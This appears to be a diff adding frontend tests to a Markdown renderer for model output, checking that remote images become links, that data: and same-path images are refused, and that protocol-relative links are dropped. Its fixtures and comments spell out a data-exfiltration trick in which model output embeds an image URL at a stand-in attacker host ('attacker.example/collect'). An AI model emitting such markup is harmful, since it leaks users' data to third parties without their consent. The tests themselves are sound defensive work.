@@ -14,6 +14,7 @@
 import { describe, expect, it } from 'vitest';
 import { render } from '@testing-library/react';
 import { Markdown } from '../markdown';
+import { ResultEnvProvider } from '../result-env';
 
 describe('block structure', () => {
   it('renders headings at their authored level, clamped to a real element', () => {
@@ -142,5 +143,94 @@ describe('emphasis inside a list is typeset like emphasis anywhere else', () => 
   it('renders a link inside a list item', () => {
     const { container } = render(<Markdown text={'- see [docs](https://example.com)'} />);
     expect(container.querySelector('li a')?.getAttribute('href')).toBe('https://example.com');
+  });
+});
+
+describe('a prose image does not phone home on paint', () => {
+  it('renders a remote image as a link carrying its alt text, not as an <img>', () => {
+    // `![](https://attacker/collect?…)` in model output is a request the browser
+    // makes as the result is PAINTED — no click, no consent, and the whole
+    // content of this view is model output.
+    const { container } = render(
+      <Markdown text="![the chart](https://attacker.example/collect?run=1)" />,
+    );
+    expect(container.querySelector('img')).toBeNull();
+    const anchor = container.querySelector('a')!;
+    expect(anchor.getAttribute('href')).toBe('https://attacker.example/collect?run=1');
+    expect(anchor.textContent).toBe('the chart');
+    expect(anchor.getAttribute('rel')).toBe('noreferrer noopener');
+  });
+
+  it('falls back to the URL when the model wrote no alt text', () => {
+    const { container } = render(<Markdown text="![](https://cdn.example/a.png)" />);
+    expect(container.querySelector('a')?.textContent).toBe('https://cdn.example/a.png');
+  });
+
+  it('paints it under the opt-in, with no referrer', () => {
+    const { container } = render(
+      <Markdown text="![a chart](https://cdn.example/a.png)" proseImages="load" />,
+    );
+    const img = container.querySelector('img')!;
+    expect(img.getAttribute('src')).toBe('https://cdn.example/a.png');
+    expect(img.getAttribute('referrerpolicy')).toBe('no-referrer');
+  });
+
+  it('takes the policy from the provider a host mounts', () => {
+    const { container } = render(
+      <ResultEnvProvider proseImages="load">
+        <Markdown text="![a chart](https://cdn.example/a.png)" />
+      </ResultEnvProvider>,
+    );
+    expect(container.querySelector('img')).toBeTruthy();
+  });
+
+  it('lets the prop win over the provider', () => {
+    const { container } = render(
+      <ResultEnvProvider proseImages="load">
+        <Markdown text="![a chart](https://cdn.example/a.png)" proseImages="link" />
+      </ResultEnvProvider>,
+    );
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.querySelector('a')).toBeTruthy();
+  });
+
+  it('refuses a data: image outright, under either policy', () => {
+    // Even a PNG the file arms would happily paint: a model's answer is not
+    // where an inline image arrives.
+    for (const mode of ['link', 'load'] as const) {
+      const { container } = render(
+        <Markdown text="![alt](data:image/png;base64,iVBORw0KGgo=)" proseImages={mode} />,
+      );
+      expect(container.querySelector('img')).toBeNull();
+      expect(container.querySelector('a')).toBeNull();
+      expect(container.textContent).toContain('alt');
+    }
+  });
+
+  it('refuses a same-origin path, which prose has no business naming', () => {
+    const { container } = render(<Markdown text="![alt](/assets/a.png)" proseImages="load" />);
+    expect(container.querySelector('img')).toBeNull();
+  });
+});
+
+describe('a link that only looks same-origin', () => {
+  it('drops a protocol-relative href but keeps its words', () => {
+    // `//host/x` points at another origin while passing a `starts with a slash`
+    // test, which is what the prefix check here used to be.
+    const { container } = render(<Markdown text="[x](//attacker.example/x)" />);
+    expect(container.querySelector('a')).toBeNull();
+    expect(container.textContent).toContain('x');
+  });
+
+  it('drops the backslash spelling the URL parser reads the same way', () => {
+    const { container } = render(<Markdown text="[x](/\\attacker.example/x)" />);
+    expect(container.querySelector('a')).toBeNull();
+  });
+
+  it('still follows a real path and a fragment', () => {
+    const { container: path } = render(<Markdown text="[x](/docs/guide)" />);
+    expect(path.querySelector('a')?.getAttribute('href')).toBe('/docs/guide');
+    const { container: anchor } = render(<Markdown text="[x](#top)" />);
+    expect(anchor.querySelector('a')?.getAttribute('href')).toBe('#top');
   });
 });
